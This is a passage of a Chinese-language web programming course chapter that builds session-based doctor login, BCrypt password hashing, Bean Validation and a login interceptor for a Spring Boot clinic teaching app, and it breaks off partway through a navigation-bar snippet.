# Ch09-D｜Session、表單驗證與醫療資料安全

> **Session Management, Form Validation, and Healthcare Data Security**
>
> 對應週次：第四週｜建議講解時間：135 分鐘

---

## 本週學習目標

完成本週課程後，你應該能夠：

1. 說明 HTTP 無狀態特性，理解 Cookie 與 Session 的運作與差別
2. 使用 `HttpSession` 實作簡單的登入狀態管理
3. 手寫醫師登入流程，理解認證機制的原理
4. 用 Spring Interceptor 保護需登入的路由
5. 使用 Bean Validation（`@NotBlank`、`@Pattern`、`@Valid`）驗證輸入
6. 說明 SQL Injection、XSS、CSRF 三大 Web 安全威脅與防範方法
7. 認識醫療資料保護的倫理原則與法規精神

---

## 1. 上週回顧與本週主題

### 上週做了什麼

你在 Ch09-C 完成了：

- 三個 Entity（Doctor、Patient、Appointment）與資料庫關聯
- 三個 Repository 繼承 `JpaRepository`
- 資料真正存入 SQLite 檔案
- `data.sql` 初始化資料
- Doctor 的完整 CRUD API

### 本週要做什麼

現在 MiniClinic 有一個嚴重的問題：**任何人都能修改任何資料**。

- 沒有人檢查你是不是醫師就能新增掛號
- 沒有人確認你是哪位醫師就能把掛號標記為「已完成」
- `/api/doctors` 甚至可以被任何人 DELETE

這週我們要處理這個問題：加入**醫師登入機制**，讓 MiniClinic 具備最基本的存取控制。

**本週結束時**：

- 醫師可以登入、登出
- 登入後進入 dashboard，只看到**自己的**當日掛號
- 醫師可以把自己的掛號標記為「已完成」或「取消」
- 未登入使用者無法看到 dashboard（自動導回登入頁）
- 表單有輸入驗證，不會接受亂填的資料

### 更重要的事：安全與倫理

但比「讓它能用」更重要的是：**醫療系統的安全責任**。

本週我們會在課堂上認真討論：

- 為什麼病歷密碼不能存明碼？
- SQL Injection 如何滲透醫療系統？
- 為什麼 AI 生成的程式碼可能有嚴重安全漏洞？
- 醫療資料的倫理邊界在哪裡？

這些問題沒有標準答案，但作為醫資學程的學生，**這些是你未來職涯中真正會碰到的**。

---

## 2. HTTP 的無狀態特性

要理解登入機制，先要理解為什麼「登入」是一個問題。

### HTTP 是無狀態的（Stateless）

HTTP 協定的設計哲學：**每一次請求都是獨立的，伺服器不記得你上次做了什麼**。

這意味著：

```
客戶端 → 伺服器：「登入，我是 D001，密碼 xxx」
伺服器 → 客戶端：「歡迎！登入成功」

(下一個請求)

客戶端 → 伺服器：「我要看我的掛號清單」
伺服器 → 客戶端：「你誰？先登入再來」   ← 伺服器根本不記得剛才登入過
```

### 為什麼 HTTP 要設計成無狀態？

- **可擴展性**：伺服器不用為每個使用者保留記憶
- **可靠性**：請求之間獨立，失敗重試簡單
- **簡單性**：協定本身不用處理複雜的狀態管理

### 解決方案：Cookie 與 Session

既然 HTTP 不記得，我們就想辦法**讓每次請求都帶上「我是誰」的證明**。

這就是 Cookie 和 Session 的由來。

---

## 3. Cookie 與 Session 的運作

### Cookie：存在客戶端的小紙條

**運作流程**：

1. 第一次訪問網站，伺服器在 Response 中附上 Cookie
2. 瀏覽器把 Cookie **存在本機**
3. 以後每次訪問同一網站，瀏覽器**自動把 Cookie 帶上**

```
第一次：
Client → Server: GET /login
Server → Client: 200 OK
                 Set-Cookie: JSESSIONID=abc123xyz

第二次：
Client → Server: GET /dashboard
                 Cookie: JSESSIONID=abc123xyz    ← 瀏覽器自動帶上
Server: 收到 Cookie，知道這是剛才登入的人
```

### Session：存在伺服器端的狀態

Cookie 裡通常只存一個**識別碼**（Session ID），真正的使用者資料存在**伺服器端**。

```
客戶端的 Cookie：
    JSESSIONID = abc123xyz

伺服器的 Session 儲存：
    abc123xyz → {
        "loggedInDoctor": "D001",
        "loginTime": "2026-04-18 10:30:00",
        "name": "陳志明醫師"
    }
```

**為什麼敏感資料不放 Cookie 裡？**
- Cookie 存在使用者的電腦，可能被篡改、竊取
- Session 存在伺服器，使用者無法直接存取

### 兩者的比較

| 比較項 | Cookie | Session |
|---|---|---|
| 存放位置 | 客戶端瀏覽器 | 伺服器記憶體（或 Redis 等）|
| 大小限制 | 每個 cookie 約 4KB | 幾乎無限 |
| 安全性 | 可被使用者看到、篡改 | 使用者看不到 |
| 存活時間 | 可設定（分鐘到數年）| 伺服器決定（預設瀏覽器關閉前）|
| 適合儲存 | 不敏感的偏好設定 | 敏感的登入狀態 |

### 本課程的選擇

**只用 Session**，不手動操作 Cookie（`JSESSIONID` 這個 cookie 由 Spring 自動管理）。

---

## 4. 手寫登入流程（不用 Spring Security）

### 為什麼不用 Spring Security？

Spring Security 是業界標準，但它有幾個學習障礙：

- 概念龐大（認證、授權、過濾器鏈、principals...）
- 預設配置強制啟用，學生會卡在設定
- 隱藏太多細節，反而學不到原理

**本課程選擇「手寫 + 簡化版」**：理解登入的**本質**，未來學 Spring Security 時會一目瞭然。

> ⚠️ **重要聲明**：我們手寫的版本**適合教學，不適合正式環境**。正式專案請用 Spring Security 或 Spring Session。

### 登入流程的四個步驟

```
① 使用者進入 /login 頁面，輸入 doctorId 和 password
         ↓
② 伺服器檢查：
   - doctorId 存在嗎？
   - 密碼正確嗎？（雜湊比對，等一下講）
         ↓
③ 正確：在 Session 裡記錄 loggedInDoctorId
   錯誤：顯示錯誤訊息
         ↓
④ 重導到 /dashboard
```

### 後續請求如何判斷「有沒有登入」？

```
使用者訪問 /dashboard
    ↓
Controller 檢查 Session 裡有沒有 loggedInDoctorId
    ↓
有 → 正常顯示
沒有 → 重導到 /login
```

---

## 5. 升級 Doctor Entity：加入密碼

### 5.1 為什麼不能存明碼密碼？

**假設 MiniClinic 的資料庫不小心外洩（很常見）**：

如果密碼是明碼：
```
D001, "陳志明醫師", "家醫科", "secret123"
D002, "林佩君醫師", "內科",   "password"
```

→ 攻擊者立刻擁有所有醫師的密碼，還可能在其他網站試用（人們常重複密碼）

如果密碼是雜湊：
```
D001, "陳志明醫師", "家醫科", "$2a$10$N9qo8uLOickgx2ZMRZo..."
```

→ 攻擊者拿到也不知道原始密碼是什麼

### 5.2 加入 passwordHash 欄位

修改 `Doctor.java`：

```java
import com.fasterxml.jackson.annotation.JsonIgnore; // 新增

@Entity
@Table(name = "doctor")
public class Doctor {

    @Id
    @Column(name = "doctor_id", length = 10)
    private String doctorId;

    @Column(name = "name", length = 50, nullable = false)
    private String name;

    @Column(name = "department", length = 20, nullable = false)
    private String department;

    @Column(name = "specialty", length = 100)
    private String specialty;

    // 新增：密碼雜湊
    // @JsonIgnore：防止 passwordHash 出現在 /api/doctors 等 JSON 回應中
    @JsonIgnore
    @Column(name = "password_hash", length = 100)
    private String passwordHash;

    // 建構子、getters、setters...
	
	// 新增：密碼 getters and setters
	public String getPasswordHash() {
        return passwordHash;
    }

    public void setPasswordHash(String passwordHash) {
        this.passwordHash = passwordHash;
    }
}
```

**為什麼需要 `@JsonIgnore`？**

不加的話，呼叫 `GET /api/doctors` 時，回應會長這樣：

```json
{
    "doctorId": "D001",
    "name": "陳志明醫師",
    "department": "家醫科",
    "specialty": "一般內科、慢性病管理",
    "passwordHash": "$2a$10$N9qo8uLOickgx2ZMRZo..."
}
```

雖然這是 BCrypt 雜湊而非明文，但這份資料**不應該出現在公開 API 回應裡**——攻擊者拿到雜湊值可以進行離線暴力破解，且這違反 §11.2 講的**資料最小化原則**。

`@JsonIgnore` 告訴 Jackson（Spring Boot 的 JSON 序列化函式庫）：序列化時跳過這個欄位，它就不會出現在任何 API 的 JSON 輸出中。

### 5.3 BCrypt：現代密碼雜湊的標準

**BCrypt** 是目前廣泛使用的密碼雜湊演算法，Spring Security 預設使用。

在 `pom.xml` 加入依賴：

```xml
<dependency>
    <groupId>org.springframework.security</groupId>
    <artifactId>spring-security-crypto</artifactId>
</dependency>

<!-- Bean Validation（@NotBlank、@Pattern、@Valid） -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-validation</artifactId>
</dependency>
```

使用範例：

```java
import org.springframework.security.crypto.bcrypt.BCrypt;

// 雜湊密碼（註冊時）
String plainPassword = "secret123";
String hashed = BCrypt.hashpw(plainPassword, BCrypt.gensalt());
// 結果類似 "$2a$10$N9qo8uLOickgx2ZMRZo5..."

// 驗證密碼（登入時）
boolean matches = BCrypt.checkpw(inputPassword, storedHash);
```

**BCrypt 的優點**：
- 自動處理 salt（每次雜湊結果不同）
- 故意設計得**慢**（每次驗證要 100ms 左右）— 讓暴力破解不可行
- 廣泛支援、久經考驗

### 5.4 更新 data.sql

對於教學，我們直接在 `data.sql` 裡放雜湊過的密碼。為了方便，**所有醫師的預設密碼都是 `pass1234`**：

```sql
-- 初始醫師資料（5 位）帶入 pass1234 的 BCrypt 雜湊
INSERT OR IGNORE INTO doctor (doctor_id, name, department, specialty, password_hash) VALUES
    ('D001', '陳志明醫師', '家醫科', '一般內科、慢性病管理','$2a$10$XhyEgd4qh5TXJa7NkMg3gOqsJxATykAyJERH7ZqTD7eEPVlcmgewm'),
    ('D002', '林佩君醫師', '內科',   '心臟血管、高血壓', '$2a$10$/x/fVm66HZJWeeYZRUbPp..gS9Czgs3a27RjYQPs75obpRoUWU9ZC'),
    ('D003', '王建華醫師', '復健科', '運動傷害、脊椎復健', '$2a$10$4fZBPZq1NJmqW5MUgOUsqukV6OiTJutAKR/WbiFiQ6PRTjFbNsMFy'),
    ('D004', '李美玲醫師', '小兒科', '兒童感冒、疫苗接種',  '$2a$10$ZlsUgEo2MOm0RYxwcP55qukrjipEXYNKyyRfdIKkOEv7RpuXEPhxK'),
    ('D005', '張雅筑醫師', '身心科', '焦慮、失眠、情緒調適', '$2a$10$XsgY9Cmk7PqJ2pve2k4xwuTnV/hakC6LOGJqicQyjH.wDiM7PQhWa');
```

這裡有兩個**刻意的格式選擇**，和「能動就好」的寫法不同：

1. **`INSERT OR IGNORE`（而非 `INSERT`）**：`data.sql` 每次啟動都會執行。如果只寫 `INSERT`，第二次啟動時主鍵 `D001` 重複，Spring Boot 會報錯並終止。`INSERT OR IGNORE` 讓 SQLite 碰到主鍵衝突時靜默跳過，重複啟動就不會出問題。

2. **明確列出欄位名稱（而非省略）**：`INSERT INTO doctor VALUES (...)` 依賴資料庫欄位的宣告順序。本週新增了 `password_hash` 欄位，若順序與 Entity 裡的 `@Column` 宣告順序不一致，資料就會填錯位置。**明確列出欄位名稱，INSERT 的順序就與資料表結構解耦**，是更安全的寫法。

> 💡 **怎麼產生這個雜湊？** 寫一小段測試程式呼叫 `BCrypt.hashpw("pass1234", BCrypt.gensalt())`，把輸出複製貼進 `data.sql` 即可。每位醫師各跑一次，得到不同的雜湊值（因為 BCrypt 每次 salt 不同——這是正常的）。

---

## 6. LoginController：實作登入

### 6.1 LoginForm 資料類別 (新增 model/LoginForm.java)

```java
package tw.edu.fju.miniclinic.model;

import jakarta.validation.constraints.NotBlank;
import jakarta.validation.constraints.Pattern;

public class LoginForm {

    @NotBlank(message = "請輸入醫師編號")
    @Pattern(regexp = "D\\d{3}", message = "醫師編號格式錯誤")
    private String doctorId;

    @NotBlank(message = "請輸入密碼")
    private String password;

    public LoginForm() {
    }

    // getters & setters...
    public String getDoctorId() {
        return doctorId;
    }

    public void setDoctorId(String doctorId) {
        this.doctorId = doctorId;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

}
```

### 6.2 LoginController (新增 controller/LoginController.java)

```java
package tw.edu.fju.miniclinic.controller;

import jakarta.servlet.http.HttpSession;
import jakarta.validation.Valid;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.crypto.bcrypt.BCrypt;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.*;

import tw.edu.fju.miniclinic.model.*;

@Controller
public class LoginController {

    @Autowired
    private DoctorRepository doctorRepo;

    // GET：顯示登入頁
    @GetMapping("/login")
    public String loginForm(Model model) {
        if (!model.containsAttribute("loginForm")) {
            model.addAttribute("loginForm", new LoginForm());
        }
        return "login";
    }

    // POST：處理登入
    @PostMapping("/login")
    public String login(
            @Valid @ModelAttribute("loginForm") LoginForm form,
            BindingResult result,
            HttpSession session,
            Model model) {

        // 步驟 1：檢查表單驗證
        if (result.hasErrors()) {
            return "login";  // 顯示錯誤訊息
        }

        // 步驟 2：查詢醫師
        Doctor doctor = doctorRepo.findById(form.getDoctorId()).orElse(null);

        // 步驟 3：檢查密碼（醫師不存在或密碼錯都給同樣的錯誤訊息，避免洩漏帳號是否存在）
        if (doctor == null || !BCrypt.checkpw(form.getPassword(), doctor.getPasswordHash())) {
            model.addAttribute("errorMessage", "醫師編號或密碼錯誤");
            return "login";
        }

        // 步驟 4：登入成功，存入 Session
        session.setAttribute("loggedInDoctorId", doctor.getDoctorId());
        session.setAttribute("loggedInDoctorName", doctor.getName());

        return "redirect:/dashboard";
    }

    // 登出
    @PostMapping("/logout")
    public String logout(HttpSession session) {
        session.invalidate();  // 清除 Session
        return "redirect:/login";
    }
}
```

### 6.3 關鍵觀念

**`HttpSession`**：Spring 會自動從請求中取出 Session 物件注入參數。

**`session.setAttribute()` / `getAttribute()`**：就像 Map 一樣儲存資料。Key 自己定，值可以是任何物件。

**`session.invalidate()`**：讓整個 Session 失效，`JSESSIONID` 也會被清除。

**為什麼「醫師不存在」和「密碼錯誤」給同樣的錯誤訊息？**
這是一個安全考量：如果你告訴攻擊者「醫師編號 D999 不存在」，他就能用這個回應枚舉所有有效的醫師編號。

### 6.4 登入頁面 (新增 resources\templates\login.html)

```html
<!DOCTYPE html>
<html lang="zh-Hant" xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <title>醫師登入 - MiniClinic</title>
    <style>
        body { font-family: "Microsoft JhengHei", sans-serif; max-width: 420px; margin: 80px auto; padding: 0 20px; }
        h1 { color: #0F2443; text-align: center; }
        .field { margin: 16px 0; }
        label { display: block; font-weight: bold; color: #0F2443; margin-bottom: 6px; }
        input { width: 100%; padding: 10px; border: 1px solid #E2E8F0; border-radius: 4px; font-size: 14px; }
        .error { color: #DC2626; font-size: 13px; margin-top: 4px; }
        button { width: 100%; background: #14B8A6; color: white; padding: 12px; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; margin-top: 12px; }
        button:hover { background: #0D9488; }
        .alert { background: #FEE2E2; color: #991B1B; padding: 12px; border-radius: 4px; margin-bottom: 16px; }
    </style>
</head>
<body>
    <h1>醫師登入</h1>

    <div class="alert" th:if="${errorMessage}" th:text="${errorMessage}"></div>

    <form th:action="@{/login}" th:object="${loginForm}" method="post">

        <div class="field">
            <label>醫師編號</label>
            <input type="text" th:field="*{doctorId}" placeholder="D001">
            <div class="error" th:if="${#fields.hasErrors('doctorId')}"
                 th:errors="*{doctorId}"></div>
        </div>

        <div class="field">
            <label>密碼</label>
            <input type="password" th:field="*{password}">
            <div class="error" th:if="${#fields.hasErrors('password')}"
                 th:errors="*{password}"></div>
        </div>

        <button type="submit">登入</button>
    </form>
	<p style="text-align: center; margin-top: 20px;">
        <a th:href="@{/}">← 回首頁</a>
    </p>
</body>
</html>
```

**幾個 Thymeleaf 新語法**：

- `#fields.hasErrors('xxx')`：檢查該欄位是否有驗證錯誤
- `th:errors="*{xxx}"`：顯示該欄位的錯誤訊息

---

## 7. Bean Validation

Bean Validation 是 Jakarta EE 的標準，讓你可以用註解**宣告式**地定義資料限制。

### 7.1 常用註解

| 註解 | 作用 | 範例 |
|---|---|---|
| `@NotNull` | 不能是 null | 任何欄位 |
| `@NotBlank` | 字串不能是 null 或空白 | 姓名、密碼 |
| `@NotEmpty` | 集合/字串不能是空 | List、陣列 |
| `@Size(min=, max=)` | 長度範圍 | 密碼至少 8 碼 |
| `@Min(value=)` / `@Max` | 數值範圍 | 年齡 >= 0 |
| `@Email` | 必須是 email 格式 | 電子信箱 |
| `@Pattern(regexp=)` | 符合正規表達式 | 病歷號、電話 |

### 7.2 加上 @Valid 啟動驗證

Controller 的參數加上 `@Valid`，Spring 才會真的執行驗證：

```java
public String login(
        @Valid @ModelAttribute("loginForm") LoginForm form,
        BindingResult result,    // ← 驗證結果要接在 @Valid 參數之後
        ...) {

    if (result.hasErrors()) {
        return "login";
    }
    // ...
}
```

### 7.3 應用到 MiniClinic：病歷號驗證

既然學了 `@Pattern`，讓 `AppointmentForm` 也加上驗證：

```java
package tw.edu.fju.miniclinic.model;

import jakarta.validation.constraints.NotBlank;
import jakarta.validation.constraints.Pattern;

public class AppointmentForm {

    @NotBlank(message = "請輸入病歷號")
    @Pattern(regexp = "TEST\\d{5}", message = "病歷號格式為 TESTxxxxx")
    private String chartNo;

    @NotBlank(message = "請選擇醫師")
    private String doctorId;

    @NotBlank(message = "請選擇日期")
    private String apptDate;

    @NotBlank(message = "請選擇時段")
    private String timeSlot;

    // 建構子與getters & setters...
}
```

**⚠️ 只改 Form 類別還不夠——Controller 也要配合修改。**

驗證註解只是「宣告規則」，要真正觸發驗證，對應的 Controller 方法參數必須加上 `@Valid` 和 `BindingResult`：

```java
// AppointmentController.java
@PostMapping("/appointment/new")
public String submitAppointment(
        @Valid @ModelAttribute("form") AppointmentForm form,   // ← 加 @Valid
        BindingResult result,                          // ← 緊接在 @Valid 參數之後
        Model model) {

    if (result.hasErrors()) {
		model.addAttribute("form", form);
		model.addAttribute("doctors", doctorRepo.findAll());
		return "appointment-new";
	}

    // 驗證通過，繼續處理掛號...
}
```

再來，只改 Form 類別和 Controller 還不夠——Thymeleaf 模板也要加上 th:errors 才能把錯誤訊息顯示給使用者看。

```html
<!-- 病歷號欄位下方加這一行 -->
  <div class="field-error" th:if="${#fields.hasErrors('chartNo')}" th:errors="*{chartNo}"></div>

<!-- 並在 <style> 加上： -->
  .field-error { color: #DC2626; font-size: 13px; margin-top: 4px; }
```

resources\templates\appointment-new.html 完整的程式碼如下：

```html
<!DOCTYPE html>
<html lang="zh-Hant" xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <title>線上掛號 - MiniClinic</title>
    <style>
        body { font-family: "Microsoft JhengHei", sans-serif; max-width: 560px; margin: 40px auto; padding: 0 20px; }
        h1 { color: #0F2443; border-bottom: 3px solid #14B8A6; padding-bottom: 8px; }
        nav { background: #0F2443; padding: 12px; border-radius: 8px; margin-bottom: 24px; }
        nav a { color: white; margin-right: 20px; text-decoration: none; font-weight: bold; }
        nav a:hover { color: #5EEAD4; }
        .field { margin: 16px 0; }
        label { display: block; font-weight: bold; color: #0F2443; margin-bottom: 6px; }
        input, select { width: 100%; padding: 8px; border: 1px solid #E2E8F0; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
        button { background: #14B8A6; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; }
        button:hover { background: #0D9488; }
        .error { background: #FEE2E2; color: #991B1B; padding: 12px 16px; border-radius: 4px; margin-bottom: 16px; }
        .field-error { color: #DC2626; font-size: 13px; margin-top: 4px; }
    </style>
</head>
<body>
    <nav>
        <a th:href="@{/}">首頁</a>
        <a th:href="@{/doctors}">醫師清單</a>
        <a th:href="@{/appointment/new}">線上掛號</a>
        <a th:href="@{/patients}">病歷資料</a>
        <a th:href="@{/appointments}">掛號記錄</a>
        <a th:href="@{/stats}">統計資訊</a>
        <a th:href="@{/login}">醫師登入</a>
    </nav>

    <h1>線上掛號</h1>

    <div th:if="${error}" class="error" th:text="${error}"></div>

    <form th:action="@{/appointment/new}" th:object="${form}" method="post">

        <div class="field">
            <label>病歷號</label>
            <input type="text" th:field="*{chartNo}" placeholder="TEST00001">
            <div class="field-error" th:if="${#fields.hasErrors('chartNo')}" th:errors="*{chartNo}"></div>
        </div>

        <div class="field">
            <label>選擇醫師</label>
            <select th:field="*{doctorId}">
                <option value="">-- 請選擇 --</option>
                <option th:each="doc : ${doctors}"
                        th:value="${doc.doctorId}"
                        th:text="${doc.name + ' (' + doc.department + ')'}">
                </option>
            </select>
            <div class="field-error" th:if="${#fields.hasErrors('doctorId')}" th:errors="*{doctorId}"></div>
        </div>

        <div class="field">
            <label>日期</label>
            <input type="date" th:field="*{apptDate}">
            <div class="field-error" th:if="${#fields.hasErrors('apptDate')}" th:errors="*{apptDate}"></div>
        </div>

        <div class="field">
            <label>時段</label>
            <select th:field="*{timeSlot}">
                <option value="">-- 請選擇 --</option>
                <option value="AM">上午門診</option>
                <option value="PM">下午門診</option>
                <option value="EVENING">夜間門診</option>
            </select>
            <div class="field-error" th:if="${#fields.hasErrors('timeSlot')}" th:errors="*{timeSlot}"></div>
        </div>

        <button type="submit">送出掛號</button>
    </form>
</body>
</html>

```

這和 §6.2 的 `LoginController` 寫法**完全一致**——`@Valid` 啟動驗證，`BindingResult` 接收驗證結果，缺一不可。如果 Controller 沒加 `@Valid`，`AppointmentForm` 上的所有 `@NotBlank`、`@Pattern` 規則會被完全忽略，表單送什麼都能通過，也不會有任何錯誤提示。

這樣學生如果在掛號表單亂打「ABC123」，會直接被擋下來並顯示錯誤訊息。

---

## 8. Interceptor：保護需登入的路由

### 8.1 為什麼需要 Interceptor？

我們有了登入機制，但每個需要登入的方法都要寫：

```java
@GetMapping("/dashboard")
public String dashboard(HttpSession session) {
    if (session.getAttribute("loggedInDoctorId") == null) {
        return "redirect:/login";
    }
    // 正常邏輯...
}
```

如果有 10 個需要登入的路由，就要寫 10 次。這違反 **DRY（Don't Repeat Yourself）原則**。

### 8.2 Interceptor 的概念

**Interceptor（攔截器）**是 Spring MVC 的機制，在請求進入 Controller 之前先做一些檢查。

```
瀏覽器發送請求
    ↓
Spring 接收
    ↓
Interceptor 先檢查 ←── 這一層可以決定「放行」或「攔截」
    ↓
放行 → Controller 執行
攔截 → 重導或回錯誤，不進入 Controller
```

### 8.3 實作 LoginRequiredInterceptor

總共要建兩個新檔案，放在兩個新 package 下
要建立的檔案與位置

  src/main/java/tw/edu/fju/miniclinic/
  ├── interceptor/
  │   └── LoginRequiredInterceptor.java   ← §8.3 的程式碼
  └── config/
      └── WebConfig.java                  ← §8.4 的程式碼

  LoginRequiredInterceptor.java — package tw.edu.fju.miniclinic.interceptor
  - 實作 HandlerInterceptor
  - 在 preHandle() 裡檢查 Session，未登入就擋下來

  WebConfig.java — package tw.edu.fju.miniclinic.config
  - 實作 WebMvcConfigurer
  - 用 addInterceptors() 告訴 Spring「哪些路徑要過這個 Interceptor」

  ---
  為什麼要分兩個 package？

  ┌──────────────────────────┬──────────────┬────────────────────────────────────────┐
  │           類別           │   Package    │                  原因                  │
  ├──────────────────────────┼──────────────┼────────────────────────────────────────┤
  │ LoginRequiredInterceptor │ interceptor/ │ 它是一個攔截器元件，負責執行邏輯       │
  ├──────────────────────────┼──────────────┼────────────────────────────────────────┤
  │ WebConfig                │ config/      │ 它是 Spring MVC 的配置，負責把元件接線 │
  └──────────────────────────┴──────────────┴────────────────────────────────────────┘

  兩者職責不同，分開放比較清楚。@Component + @Configuration 的分法也反映了這個差異。
  
新增 interceptor/LoginRequiredInterceptor.java

```java
package tw.edu.fju.miniclinic.interceptor;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.HttpSession;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.HandlerInterceptor;

@Component
public class LoginRequiredInterceptor implements HandlerInterceptor {

    @Override
    public boolean preHandle(HttpServletRequest request,
                             HttpServletResponse response,
                             Object handler) throws Exception {

        HttpSession session = request.getSession();
        Object loggedIn = session.getAttribute("loggedInDoctorId");

        if (loggedIn == null) {
            // 未登入：API 請求回 401，頁面請求重導到 /login
            String path = request.getRequestURI();
            if (path.startsWith("/api/")) {
                response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);  // 401
                response.getWriter().write("{\"error\":\"請先登入\"}");
            } else {
                response.sendRedirect("/login");
            }
            return false;  // 阻止後續執行
        }

        return true;  // 放行
    }
}
```

### 8.4 註冊 Interceptor

告訴 Spring 這個 Interceptor 要套用到哪些路徑：
新增 config/WebConfig.java

```java
package tw.edu.fju.miniclinic.config;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

import tw.edu.fju.miniclinic.interceptor.LoginRequiredInterceptor;

@Configuration
public class WebConfig implements WebMvcConfigurer {

    @Autowired
    private LoginRequiredInterceptor loginInterceptor;

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(loginInterceptor)
            .addPathPatterns(
                "/dashboard",
                "/dashboard/**",
                "/api/auth/me",
                "/api/appointments/*/status"
            )
            .excludePathPatterns(
                "/login",
                "/logout"
            );
    }
}
```

**意思**：
- 這些路徑需要登入：`/dashboard`、以 `/dashboard/` 開頭的所有路徑、`/api/auth/me`、`/api/appointments/{id}/status`
- 這些路徑不需要登入：`/login`、`/logout`

---

## 9. 建立 Dashboard 頁面

### 9.1 DashboardController (新增 controller/DashboardController.java)

```java
package tw.edu.fju.miniclinic.controller;

import jakarta.servlet.http.HttpSession;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;

import tw.edu.fju.miniclinic.model.Appointment;
import tw.edu.fju.miniclinic.model.AppointmentRepository;
import tw.edu.fju.miniclinic.model.Doctor;
import tw.edu.fju.miniclinic.model.DoctorRepository;

import java.time.LocalDate;
import java.util.List;

@Controller
public class DashboardController {

    @Autowired
    private DoctorRepository doctorRepo;

    @Autowired
    private AppointmentRepository appointmentRepo;

    @GetMapping("/dashboard")
    public String dashboard(HttpSession session, Model model) {
        String doctorId = (String) session.getAttribute("loggedInDoctorId");
        Doctor doctor = doctorRepo.findById(doctorId).orElse(null);

        // Session 裡的 doctorId 查不到對應醫師（資料被刪除等異常情況）
        if (doctor == null) {
            session.invalidate();
            return "redirect:/login";
        }

        LocalDate today = LocalDate.now();
        List<Appointment> myAppointments = appointmentRepo.findByDoctorAndApptDate(doctor, today);

        model.addAttribute("doctor", doctor);
        model.addAttribute("appointments", myAppointments);
        model.addAttribute("today", today);

        return "dashboard";
    }
}

```

### 9.2 AppointmentRepository 加方法 (修改 model/AppointmentRepository.java)

```java
public interface AppointmentRepository extends JpaRepository<Appointment, Long> {
    List<Appointment> findByApptDate(LocalDate apptDate);
    List<Appointment> findByDoctor(Doctor doctor);
    List<Appointment> findByPatient(Patient patient);
    List<Appointment> findByDoctorAndApptDate(Doctor doctor, LocalDate apptDate);  // 新加入
}
```

### 9.3 更新掛號狀態的 API (修改 controller/AppointmentApiController.java)

```java
@PutMapping("/api/appointments/{apptId}/status")
public ResponseEntity<Appointment> updateStatus(
		@PathVariable Long apptId,
		@RequestBody Map<String, String> payload,
		HttpSession session) {

	String loggedInDoctorId = (String) session.getAttribute("loggedInDoctorId");

	Appointment appt = appointmentRepo.findById(apptId).orElse(null);
	if (appt == null) {
		return ResponseEntity.notFound().build();
	}

	// 只能修改自己的掛號
	if (!appt.getDoctor().getDoctorId().equals(loggedInDoctorId)) {
		return ResponseEntity.status(403).build();
	}

	String newStatus = payload.get("status");
	if (!List.of("BOOKED", "COMPLETED", "CANCELLED").contains(newStatus)) {
		return ResponseEntity.badRequest().build();
	}

	appt.setStatus(newStatus);
	return ResponseEntity.ok(appointmentRepo.save(appt));
}
```

**重要觀念：403 vs 401**

- **401 Unauthorized**：你沒登入
- **403 Forbidden**：你有登入，但沒權限做這件事

醫師 D001 試圖改 D002 的掛號 → 應該回 403，不是 401。

### 9.4 Dashboard 頁面模板 (新增 resources/templates/dashboard.html)

```html
<!DOCTYPE html>
<html lang="zh-Hant" xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <title>Dashboard - MiniClinic</title>
    <style>
        body { font-family: "Microsoft JhengHei", sans-serif; max-width: 960px; margin: 40px auto; padding: 0 20px; }
        header { display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid #14B8A6; padding-bottom: 12px; }
        h1 { color: #0F2443; margin: 0; }
        .logout-form { margin: 0; }
        .logout-form button { background: #94A3B8; color: white; padding: 6px 14px; border: none; border-radius: 4px; cursor: pointer; }
        table { width: 100%; border-collapse: collapse; margin-top: 24px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #E2E8F0; }
        th { background: #0F2443; color: white; }
        .status-BOOKED    { color: #F59E0B; font-weight: bold; }
        .status-COMPLETED { color: #10B981; font-weight: bold; }
        .status-CANCELLED { color: #94A3B8; }
    </style>
</head>
<body>
    <header>
        <div>
            <h1>Dashboard</h1>
            <p>歡迎，<span th:text="${doctor.name}"></span>（<span th:text="${doctor.department}"></span>）</p>
        </div>
        <form class="logout-form" th:action="@{/logout}" method="post">
            <button type="submit">登出</button>
        </form>
    </header>

    <h2 th:text="|今日掛號：${today}|"></h2>

    <p th:if="${appointments.isEmpty()}">今日沒有掛號。</p>

    <table th:unless="${appointments.isEmpty()}">
        <thead>
            <tr>
                <th>時段</th>
                <th>病患</th>
                <th>病歷號</th>
                <th>狀態</th>
            </tr>
        </thead>
        <tbody>
            <tr th:each="appt : ${appointments}">
                <td th:text="${appt.timeSlot}">AM</td>
                <td th:text="${appt.patient.name}">測試病患甲</td>
                <td th:text="${appt.patient.chartNo}">TEST00001</td>
                <td>
                    <span th:text="${appt.status}"
                          th:class="${'status-' + appt.status}">BOOKED</span>
                </td>
            </tr>
        </tbody>
    </table>
        <p style="text-align: center; margin-top: 20px;">
        <a th:href="@{/}">← 回首頁</a>
    </p>
</body>
</html>
```

### 9.5 導覽列中，加入登入畫面的連結 (至少要在首頁裡放入)

```html
<nav>
	<a th:href="@{/}">首頁</a>
	<a th:href="@{/doctors}">醫師清單</a>
	<a th:href="@{/appointment/new}">線上掛號</a>
	<a th:href="@{/patients}">病歷資料</a>
	<a th:href="@{/appointments}">掛號記錄</a>
